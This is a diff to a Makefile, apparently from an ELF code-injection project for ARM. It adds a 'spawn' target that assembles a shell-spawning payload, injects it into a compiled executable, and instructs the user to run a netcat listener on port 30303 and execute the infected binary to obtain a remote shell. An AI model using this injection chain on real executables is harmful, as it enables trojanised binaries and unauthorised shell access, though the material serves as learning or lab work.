@@ -22,6 +22,19 @@ test:
 	echo "running injected binary..."
 	./out.elf
 
+spawn:
+	$(CC) -no-pie -static -marm -nostdlib -nostartfiles -o test.o test.c
+	as -o spawn_shell.o spawn_shell.S
+	objcopy -O binary spawn_shell.o spawn.bin
+	./$(BIN) test.o spawn.elf spawn.bin
+	chmod +x spawn.elf
+	readelf -h spawn.elf
+	readelf -l spawn.elf
+	echo
+	echo "open a new terminal and run nc -lvp 30303"
+	echo "then execute ./spawn.elf in the old terminal"
+	echo "then on the other terminal try the shell"
+
 debug: test.o out.elf payload.bin
 	@printf "\nmain() disassembly\n"
 	@MAIN=$$(readelf -s test.o | awk '/ main$$/{printf "%08x", strtonum("0x"$$2)}'); \
@@ -54,4 +67,4 @@ debug: test.o out.elf payload.bin
 	@strace ./out.elf 2>&1 || true
 
 clean:
-	rm -f $(BIN) out.elf test.o payload_arm.o payload.bin	
+	rm -f $(BIN) out.elf spawn.elf test.o payload_arm.o payload.bin spawn_shell.o spawn.bin
